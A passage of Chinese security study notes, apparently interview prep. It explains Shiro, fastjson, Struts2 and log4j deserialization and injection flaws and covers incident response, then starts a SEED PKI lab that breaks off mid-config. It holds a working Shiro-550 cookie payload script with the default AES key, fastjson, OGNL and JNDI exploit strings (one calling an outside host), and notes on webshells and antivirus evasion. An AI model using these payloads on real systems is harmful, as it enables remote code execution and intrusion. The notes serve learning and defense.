Shiro</h1><blockquote><p>shiro 550 721区别</p><p>漏洞成因是因为有一个remeberme的方法，它可以对cookie进行加密后存储，下次访问就不需要登录了，生成方法是对cookie先进行序列化，aes加密，base64加密</p><p>550就是aes它是使用固定的key进行加密，所以就可以直接构造cookie利用</p><p>721的话是使用aes128cbc加密，可以不固定，可以使用padding oracle attack的工具进行利用，好像还需要提供一个有效的cookie，以及需要明确对方的操作系统</p></blockquote><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理</p><blockquote><p>反序列化操作的本质是将输入的字节流转换成程序中的对象实例，而在Java中，对象实例的创建与对象的构造函数相关联，因此攻击者在构造恶意序列化数据时可以搭载特定的构造函数，进而在反序列化时触发自定义的代码</p></blockquote><h2 id="Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="Shiro rememberMe反序列化漏洞（Shiro-550）"></a>Shiro rememberMe反序列化漏洞（Shiro-550）</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie</p><p>生成过程：rememberMe的值-》序列化-》AES加密-》base64编码-》得到cookie值</p><p>服务器：base64解码-》然后AES解密-》再反序列化，就导致了反序列化RCE漏洞</p><p><strong>如果使用了默认的硬编码的AES秘钥<code>kPH+bIxk5D2deZiIxcaaaA==</code>，那么就可以构造恶意payload，通过在cookie的rememberMe字段中插入恶意payload，触发shiro框架的rememberMe的反序列化功能，导致任意代码执行</strong></p><h3 id="如何发现使用Shiro的系统"><a href="#如何发现使用Shiro的系统" class="headerlink" title="如何发现使用Shiro的系统"></a>如何发现使用Shiro的系统</h3><ul><li>在登录页面时，提交表单后看set-cookie是否存在remeberMe=deleteMe(认证失败时会设置deleteMe的cookie:)</li><li>在流量中搜索remeberMe=deleteMe</li><li>fofa的搜索关键词：header=”rememberme=deleteMe”、header=”shiroCookie”</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>获取反向shell</li><li>远程代码执行</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])   <br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode())<br></code></pre></td></tr></table></figure><h2 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h2><blockquote><p><strong>这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用</strong><code>登录后rememberMe=&#123;value&#125;去爆破正确的key值</code><strong>进而反序列化，对比Shiro550条件只要有</strong><code>足够密钥库</code><strong>（条件比较低）、Shiro721需要登录（要求比较高</strong><del><strong>鸡肋</strong></del>）。</p></blockquote><p>Shiro使用了<strong>AES-128-CBC加密</strong>（Cipher Block Chaining , 密码分组链接模式）</p><p>明文按照固定大小进行分组，最后一个数据块会进行填充，使其满足块的长度要求。假设最后一个数据块分组不为16byte时，就会进行填充，每个被填充的字节的值就是被填充的字节数量 。比如说，<strong>如果缺少四个字节，那么这四个字节都会被填充为0x04</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305011823616.png"></p><p>上面是CBC的流程，初始化向量（IV）会被用在加密和解密的过程中</p><ul><li><p>加密：第一段明文和IV异或，之后进行加密，将结果与下一段明文进行异或，这样的话，可以使得即使是相同的明文，也可以被加密成不同的内容</p></li><li><p>解密：第一段密文进行解密，解密结果与IV进行异或，这样才能得到明文</p></li></ul><p>若最后1个解密出的明文padding填充值错误，会导致解密不成功，报错。因此可以通过爆破进行攻击</p><ul><li>检测密文最后一组的填充值是否正确来确定能否正常解密</li><li>通过服务端解密后的响应状态来判断填充的字节是否正确来进行穷举攻击<ul><li>用户的密文与填充数据正确 ==&gt; 200</li><li>用户的密文与填充数据都错误 ==&gt; 500</li><li>用户的密文正确，填充数据错误 ==&gt; 301</li></ul></li></ul><p>CBC字节翻转攻击的原理 : 通过损坏密文字节来改变明文字节</p><p>写不下去了，参考一下这个：</p><ul><li><p><a href="https://blog.h4ck.fun/shiro_721_analysis/">https://blog.h4ck.fun/shiro_721_analysis/</a></p></li><li><p><a href="https://goodapple.top/archives/217#leftbar_tab_catalog">https://goodapple.top/archives/217#leftbar_tab_catalog</a></p></li><li><p><a href="https://www.sec-in.com/article/999">https://www.sec-in.com/article/999</a></p></li><li><p><a href="https://blog.csdn.net/weixin_45605352/article/details/116846678">https://blog.csdn.net/weixin_45605352/article/details/116846678</a></p></li><li><p><a href="https://blog.csdn.net/qq_41874930/article/details/121314926">https://blog.csdn.net/qq_41874930/article/details/121314926</a></p></li></ul><h1 id="fastjson漏洞"><a href="#fastjson漏洞" class="headerlink" title="fastjson漏洞"></a>fastjson漏洞</h1><p>Fastjson是一个Java语言编写的高性能JSON处理库，支持将Java对象转换为JSON串，以及将JSON串转换为Java对象</p><h2 id="fastjson-1-2-24反序列化导致任意命令执行漏洞（CVE-2017-18349）"><a href="#fastjson-1-2-24反序列化导致任意命令执行漏洞（CVE-2017-18349）" class="headerlink" title="fastjson 1.2.24反序列化导致任意命令执行漏洞（CVE-2017-18349）"></a>fastjson 1.2.24反序列化导致任意命令执行漏洞（CVE-2017-18349）</h2><p>@type是fastjson中用于指定Java类类型信息的一种注解标签。在fastjson的反序列化过程中，如果发现JSON串中存在@type标签，fastjson会根据该标签来进行自动类型转换。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.example.User&quot;</span>,<br>    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-attr">&quot;age&quot;</span>: <span class="hljs-number">25</span><br>&#125;<br></code></pre></td></tr></table></figure><p>fastjson在解析该JSON串时，会根据@type的值（”com.example.User”），将该JSON串转换成一个对应的Java对象（com.example.User类型），并将JSON串中的字段值设置到Java对象相应的属性中。</p><p>攻击者可以通过构造特定的JSON数据，JSON字符串中包含了**@type注解，并在其中指向了一个恶意类，那么fastjson在反序列化时会自动实例化这个恶意类，并尝试调用其中的setter方法设置恶意的参数值**</p><p>setter方法（也称作设置方法）是一种用于设置某个对象属性值的特殊方法。setter方法通常采用 public void setXXX(XXX value)的命名方式，在其中使用一个参数value来设置对象中的属性值。</p><p>例如，一个类可能包含一个叫做name的属性，那么它的setter方法通常定义如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>)</span> &#123;<br>    <span class="hljs-built_in">this</span>.name = name;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个setter方法通过使用参数name设置类中的name属性。通过设置setter方法，可以控制属性的访问权限，避免直接对成员变量进行操作，从而增强了程序的安全性和封装性。</p><p>攻击者可以通过构造含有特定setter方法的payload，利用fastjson库自动调用这个方法并传入恶意参数来实现攻击。此类攻击通常被称为fastjson反序列化远程代码执行（RCE）漏洞</p><p>常见的exploit payload是：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-attr">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,<span class="hljs-attr">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>@type</code>指定要实例化的类型，<code>dataSourceName</code>指定了RMI（远程方法调用）的服务地址和服务名。这个payload会将JdbcRowSetImpl实例化并连接到指定的RMI服务，从而实现RCE（远程代码执行）攻击</p><h1 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h1><h2 id="Struts2-016命令执行漏洞"><a href="#Struts2-016命令执行漏洞" class="headerlink" title="Struts2-016命令执行漏洞"></a>Struts2-016命令执行漏洞</h2><blockquote><p>struts2漏洞有一个明显的特征就是url路径里有*.action或*.do</p></blockquote><p>在Struts2中，DefaultActionMapper类是一个用于处理URL到Action的映射的默认实现。它支持使用”action:”、”redirect:”和”redirectAction:”作为导航或重定向前缀。这些前缀后面可以跟随Action名称或OGNL表达式。</p><p><strong>由于Struts2没有对这些前缀进行过滤，攻击者可以在URL中注入恶意的OGNL表达式，从而执行任意的Java静态方法，包括执行系统命令</strong>。这种漏洞被称为”远程命令执行”（RCE）漏洞，是一种非常危险的安全漏洞。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">redirect:$&#123;<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span>=false,#f=#_memberAccess<span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.getDeclaredField</span>(<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.setAccessible</span>(true),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.set</span>(#_memberAccess,true),@org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span>.IOUtils@toString(@java<span class="hljs-selector-class">.lang</span>.Runtime@getRuntime()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;echo has vul&#x27;</span>)<span class="hljs-selector-class">.getInputStream</span>())&#125;<br></code></pre></td></tr></table></figure><p>一个恶意的Struts2 URL，其中利用了OGNL表达式注入漏洞，通过设置xwork.MethodAccessor.denyMethodExecution为false，允许执行任意方法，然后利用反射机制修改_memberAccess对象的allowStaticMethodAccess属性，使其允许访问静态方法，最后调用java.lang.Runtime类的exec方法执行命令”echo has vul”，并将输出结果转换为字符串返回。</p><p>为了避免这种漏洞，建议在使用Struts2时，对输入进行严格的验证和过滤，避免将用户输入作为OGNL表达式直接传递给DefaultActionMapper类</p><h2 id="045"><a href="#045" class="headerlink" title="045"></a>045</h2><p>045漏洞是指Apache Struts框架中的一个漏洞，其成因是在接受content type值时，未能正确地验证和过滤用户输入，导致攻击者可以通过构造恶意的OGNL表达式，实现远程代码执行。其中，OGNL是一种表达式语言，用于在Java应用程序中访问和操作对象的属性和方法。</p><p>攻击者可以通过在HTTP请求中添加恶意的payload，其中包含OGNL语法和member access字段，来触发漏洞。一旦漏洞被利用成功，攻击者可以在受影响的服务器上执行任意代码，从而控制服务器或窃取敏感信息。</p><ul><li>memberaccess是OGNL表达式中的一个关键字，用于控制OGNL表达式对Java对象的访问权限。在OGNL表达式中，memberaccess字段可以设置为”true”或”false”，分别表示允许或禁止访问Java对象的私有成员变量和方法。</li><li>在045漏洞中，攻击者可以通过在HTTP请求中添加恶意的payload，其中包含memberaccess字段，来控制OGNL表达式对Java对象的访问权限，从而实现远程代码执行。具体来说，攻击者可以将memberaccess字段设置为”true”，以允许访问Java对象的私有成员变量和方法，从而执行任意代码。</li></ul><p>为了检测和防止045漏洞的攻击，可以查看服务器的catalina.out日志文件，其中可能会记录有关攻击的相关信息，例如恶意请求的URL和payload等</p><h1 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h1><blockquote><p>log4j2框架下的lookup服务提供了{}字段解析功能，传进去的值会被直接解析，JNDI服务会请求远程服务来链接本地对象，这时候只用在｛}里面调用JNDI服务即可反弹shell到指定服务器</p><p>特征:数据包里有{jndi:ladp//}字段</p></blockquote><p><strong>在前端页面上输入了：${jndi:rmi://xxx.com:8080/evil} 这串字符， 然后后台用log4j记录了这串字符， log4j会自动使用jndi调用这个地址上的rmi内容</strong></p><p>这个漏洞可以让攻击者通过向受影响的应用程序发送包含恶意JNDI（Java Naming and Directory Interface）引用的字符串来执行任意代码。这些字符串通常以${jndi:开头，后面跟着一个攻击者控制的服务器地址和一个可执行的命令。</p><p> JNDI是Java命名和目录接口，它是一种提供命名和目录功能的API，可以让Java应用程序访问各种命名和目录服务</p><p>RMI（Remote Method Invocation）是Java中的一种机制，用于实现远程过程调用（RPC）。它允许在不同的Java虚拟机（JVM）之间进行通信，并使得在一个JVM中的Java对象能够调用在另一个JVM中的Java对象的方法，就像在本地调用一样。RMI是Java平台的一部分，提供了一种简单的方法来实现分布式应用程序。</p><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>1.收集客户机器信息以及样本，做好文件备份</p><p>2.判断安全事件的类型，是系统层面的，如挖矿病毒、后门木马，还是网络应用层面的，如webshell，或者是网络层面，如断网、DDOS等</p><p>3.隔离机器</p><p>4.日志、用户、进程、启动项、样本，看到可疑的就杀掉，删文件，打补丁，溯源</p><p>5.产出一份安全事件报告</p><ul><li>将类似%WINDIR%System32目录进行时间顺序排查</li><li>查看网络、端口：netstat -ano、ps -ef、netstat -antlp</li><li>查看登录用户：who</li><li>查看账户、用户信息：cat /etc/passwd /etc/shadow /etc/group</li><li>lastlog # 最近登录日志</li><li>crontal -l查看计划任务</li><li>top查看CPU利用</li><li>history查看历史命令</li></ul><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p><strong>如何向服务器写入webshell</strong></p><p>以下是一些可能被攻击者利用的 WebShell 写入方式：</p><ol><li>文件上传漏洞：如果 Web 应用程序存在上传文件的功能，而上传文件未经过严格的验证和过滤，那么攻击者可以上传带有 WebShell 的文件到服务器。</li><li>SQL 注入：如果 Web 应用程序存在 SQL 注入漏洞，攻击者可以通过注入的方式执行系统命令或写入 WebShell 到服务器上。</li></ol><p><strong>/<em>!</em>/为什么能绕过waf</strong></p><ul><li>“/<em>!</em>/“ 可以使 WAF 无法直接识别出语句中包含了 “UNION SELECT” 关键字，从而绕过简单的 SQL 注入规则检测。</li></ul><p>拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</p><blockquote><p>.htaccess 是 Apache Web 服务器配置文件的一种，用于为特定目录下的网站配置属性、权限、重定向、错误处理等规则</p></blockquote><ul><li>隐藏 WebShell：攻击者可能会修改 .htaccess 文件，将 WebShell 的访问权限限制只允许特定的 IP 地址或域名访问，防止其它人通过公网访问到该 Shell。</li><li>重定向攻击：攻击者可能会通过修改 .htaccess 文件来进行重定向攻击，将用户请求重定向到恶意的网站或页面上，以窃取用户信息或传播恶意软件。</li></ul><p>判断出网站的CMS（内容管理系统）对渗透测试有很大的意义，因为不同的CMS可能存在不同的安全漏洞和攻击面，攻击者可以利用这些漏洞来实施攻击</p><p>3389(远程连接)无法连接的几种情况</p><ul><li>防火墙阻止连接</li><li>网络连接问题</li><li>端口被占用</li><li>远程桌面服务未启用</li></ul><p>渗透测试如何判断目标操作系统</p><ul><li>操作系统指纹识别工具</li><li>ping的TTL值</li><li>漏洞扫描工具（如OpenVAS、Nessus等）可以扫描目标主机上已知的漏洞，并根据漏洞类型和影响范围来推断目标操作系统。例如，如果漏洞扫描工具检测到目标主机上存在MS17-010漏洞，则可以推断目标操作系统为Windows</li><li>如果Web应用程序返回的HTTP响应头中包含“Server: Apache/2.4.7 (Ubuntu)”信息，则可以推断目标操作系统为Ubuntu Linux</li></ul><p>蚁剑/菜刀/C刀/冰蝎的相同与不相同之处</p><ul><li>蚁剑/菜刀/C刀/冰蝎都是一些常用的WebShell管理工具，它们可以帮助攻击者在控制了网站后进行文件操作、命令执行、数据库管理等操作</li><li>相同之处是都需要在目标网站上植入一句话木马，然后通过客户端与之通信，发送加密或编码后的数据包，执行相应的功能</li><li>不同之处主要在于加密或编码方式、流量特征、功能模块等方面<ul><li>菜刀是最早的WebShell管理工具，它使用Base64编码和eval函数来加密和执行数据包，流量特征为@eval和base64_decode。</li><li>功能模块包括文件管理、虚拟终端、数据库管理等</li></ul></li><li>蚁剑是一款开源的跨平台WebShell管理工具，它支持多种编码器和加密器，可以自定义数据包格式，流量特征较难被检测</li><li>冰蝎是一款动态二进制加密的WebShell管理工具，它使用AES加密算法和openssl函数来加密和解密数据包，流量特征为openssl_decrypt。它的功能模块包括文件管理、虚拟终端、数据库管理、Socks代理、反弹shell等</li></ul><p>Windows常用的提权方法</p><ul><li>弱口令或漏洞进行提权，如数据库服务、Web服务、远程桌面服务</li></ul><p>正向代理和反向代理的区别</p><ul><li>正向代理是代理客户端，为客户端收发请求，使真实客户端对服务器不可见（VPN：local-》proxy-》Google）</li><li>反向代理代理服务端，用户并不知道服务端是哪个发来的（拨打10086，10086就是反向代理，我们不知道客服是谁）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305052226209.png"></p><p>鱼叉攻击是一种针对特定目标的网络攻击，攻击者通过伪装成可信的发送者，向目标发送钓鱼邮件或信息，诱骗目标点击恶意链接或下载恶意附件，从而获取目标的敏感信息或控制目标的计算机</p><p>水坑攻击是一种通过植入恶意代码或篡改网站等方式，诱骗目标访问恶意网站或下载恶意软件，从而获取目标的敏感信息或控制目标的计算机</p><p>木马免杀</p><ul><li><p>在metasploit框架下免杀的方式之一是msf编码器，功能是使用msf编码器对我们制作的木马进行重新编码，生成一个二进制文件，这个文件运行后，msf编码器会将原始程序解码到内存中并执行。</p></li><li><p>upx file，对file文件进行加壳处理</p></li></ul><p>如何验证是否存在CDN：nslookup命令</p><h1 id="Weblogic-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1><blockquote><p>WLS：weblogic server,wls组件对外提供webserver服务</p></blockquote><p>触发方式：访问ip:port/wls-wsat/CoordinatorPortType，抓包，使用POST传递参数</p><p>原理：Weblogic“wls-wsat”组件在反序列化操作时使用了<strong>XMLDecoder</strong>类进行XML反序列化操作引发了代码执行</p><p><a href="https://xz.aliyun.com/t/8465">https://xz.aliyun.com/t/8465</a></p><h1 id="常见代码执行、文件读取、命令执行的函数"><a href="#常见代码执行、文件读取、命令执行的函数" class="headerlink" title="常见代码执行、文件读取、命令执行的函数"></a>常见代码执行、文件读取、命令执行的函数</h1><ol><li>代码执行函数：eval()、Function()、setTimeout()、setInterval()、new Function()等。</li><li>文件读取函数：file_get_contents()、fopen()、readfile()、file()、fgets()等。</li><li>命令执行函数：exec()、system()、passthru()、shell_exec()、popen()等。</li></ol><h1 id="有用的github项目"><a href="#有用的github项目" class="headerlink" title="有用的github项目"></a>有用的github项目</h1><ul><li><a href="https://www.revshells.com/">Online - Reverse Shell Generator</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF</a></li><li>应急响应实战笔记 <a href="https://github.com/Bypass007/Emergency-Response-Notes">GitHub - Bypass007/Emergency-Response-Notes: 应急响应实战笔记，一个安全工程师的自我修养。</a></li></ul><h1 id="一些文章"><a href="#一些文章" class="headerlink" title="一些文章"></a>一些文章</h1><p><a href="https://www.wangan.com/p/7fy78403bdf27404">蓝队面试题整理（防守方面试题整理） - 网安</a></p><p><a href="http://www.tlcement.com/27237.html">2022年蓝队初级护网面试题总结-网络知识</a></p><p> <a href="https://javasec.org/">攻击Java Web应用-[Java Web安全]</a></p><p><a href="http://www.tlcement.com/27237.html">2022年蓝队初级护网面试题总结-网络知识</a></p><ul><li><a href="https://websec.readthedocs.io/zh/latest/index.html">Web安全学习笔记 — Web安全学习笔记 1.0 文档</a><ul><li>内网渗透章节</li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Public-Key Infrastructure (PKI) Lab</title>
    <link href="/p/135735d/"/>
    <url>/p/135735d/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/202306241631184.png"></p><h1 id="Lab-Environment"><a href="#Lab-Environment" class="headerlink" title="Lab Environment"></a>Lab Environment</h1><p>下载docker文件、解压、运行docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl https://seedsecuritylabs.org/Labs_20.04/Files/Crypto_PKI/Labsetup.zip --output pki.zip</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> unzip pki.zip</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dcbuild <span class="hljs-comment"># docker-compose build</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dcup <span class="hljs-comment"># docker-compose up</span></span><br></code></pre></td></tr></table></figure><p>这里docker可能没有速度，把/etc/docker/daemon.json文件写入下面的源即可</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># cat  <span class="hljs-regexp">/etc/</span>docker/daemon.json<br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://hub-mirror.c.163.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://mirror.baidubce.com&quot;</span><br>  ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>SEED VM已经提前做好了命令替换 ，可以看到.bashrc有如下代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Commands <span class="hljs-keyword">for</span> <span class="hljs-keyword">for</span> docker</span> <br>alias dcbuild=&#x27;docker-compose build&#x27;<br>alias dcup=&#x27;docker-compose up&#x27;<br>alias dcdown=&#x27;docker-compose down&#x27;<br>alias dockps=&#x27;docker ps --format &quot;&#123;&#123;.ID&#125;&#125;  &#123;&#123;.Names&#125;&#125;&quot;&#x27;<br>docksh() &#123; docker exec -it $1 /bin/bash; &#125;<br></code></pre></td></tr></table></figure><p>给/etc/hosts文件增加映射</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.9.0.80</span> www.gls23.com<br></code></pre></td></tr></table></figure><h1 id="Task-1-Becoming-a-Certificate-Authority-CA"><a href="#Task-1-Becoming-a-Certificate-Authority-CA" class="headerlink" title="Task 1: Becoming a Certificate Authority (CA)"></a>Task 1: Becoming a Certificate Authority (CA)</h1><blockquote><p>证书颁发机构(CA)是颁发数字证书的可信实体。数字证书证明证书的指定主体对公钥的所有权。许多商业 CA 被视为根 CA; VeriSign 是编写本文时最大的 CA。希望获得商业 CA 颁发的数字证书的用户需要向这些 CA 支付费用。</p><p>在这个实验室，我们需要创建数字证书。我们自己将成为一个根 CA，并为这个 CA 生成一个证书。然后使用这个 CA 为其他 CA (例如服务器)颁发证书。</p><p>与通常由另一个 CA 签名的其他证书不同，根 CA 的证书是自签名的。Root CA 的证书通常预先加载到大多数操作系统、 Web 浏览器和其他依赖 PKI 的软件中。根 CA 的证书是无条件受信任的</p></blockquote><h2 id="配置文件-openssl-conf"><a href="#配置文件-openssl-conf" class="headerlink" title="配置文件 openssl.conf"></a>配置文件 openssl.conf</h2><blockquote><p>为了使用 OpenSSL 创建证书，必须有一个配置文件。</p><p>配置文件通常有一个扩展名.Cnf。它由三个 OpenSSL 命令使用: ca、 req 和 x509</p></blockquote><p>默认情况下，OpenSSL 使用来自/usr/lib/ssl/OpenSSL.cnf 的配置文件。因为我们需要对这个文件进行更改，所以我们将把它复制到我们的工作目录中，并指示 OpenSSL 使用这个副本。配置文件的[ CA default ]部分显示了我们需要准备的默认设置。</p><p>在使用 OpenSSL 生成证书时，可以使用 <code>-config</code> 参数来指定要使用的 <code>openssl.cnf</code> 配置文件。该参数允许你提供自定义的配置文件路径。</p><p>以下是使用 OpenSSL 命令生成证书时指定 <code>openssl.cnf</code> 文件的示例命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl req -new -config /path/to/openssl.cnf -keyout private.key -out csr.csr<br></code></pre></td></tr></table></figure><p>进入/usr/lib/ssl看一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/21/23]seed@VM:.../ssl$ ll<br>total 4<br>lrwxrwxrwx 1 root root   14 Nov 24  2020 certs -&gt; /etc/ssl/certs<br>drwxr-xr-x 2 root root 4096 Jul 31  2020 misc<br>lrwxrwxrwx 1 root root   20 Nov 24  2020 openssl.cnf -&gt; /etc/ssl/openssl.cnf<br>lrwxrwxrwx 1 root root   16 Nov 24  2020 private -&gt; /etc/ssl/private<br></code></pre></td></tr></table></figure><p>查看一下openssl.cnf文件的内容，很长，我们关注一下配置文件的[ CA default ]部分，它显示了我们需要准备的默认设置</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs clean">####################################################################<br>[ CA_default ]<br><br>dir             = ./demoCA              # Where everything is kept<br>certs           = $dir/certs            # Where the issued certs are kept<br>crl_dir         = $dir/crl              # Where the issued crl are kept<br>database        = $dir/index.txt        # database index file.<br>unique_subject  = no                    # Set to <span class="hljs-string">&#x27;no&#x27;</span> to allow creation <span class="hljs-keyword">of</span><br>                                        # several certs <span class="hljs-keyword">with</span> same subject.<br>new_certs_dir   = $dir/newcerts         # default place for new certs.<br><br>certificate     = $dir/cacert.pem       # The CA certificate<br>serial          = $dir/serial           # The current serial number<br>crlnumber       = $dir/crlnumber        # the current crl number<br>                                        # must be commented out to leave a V1 CRL<br>crl             = $dir/crl.pem          # The current CRL<br>private_key     = $dir/private/cakey.pem# The private key<br><br>x509_extensions = usr_cert              # The extensions to add to the cert<br><br># Comment out the following two lines for the <span class="hljs-string">&quot;traditional&quot;</span><br># (and highly broken) format.<br>name_opt        = ca_default            # Subject Name options<br>cert_opt        = ca_default            # Certificate field options<br><br># Extension copying option: use <span class="hljs-keyword">with</span> caution.<br># copy_extensions = 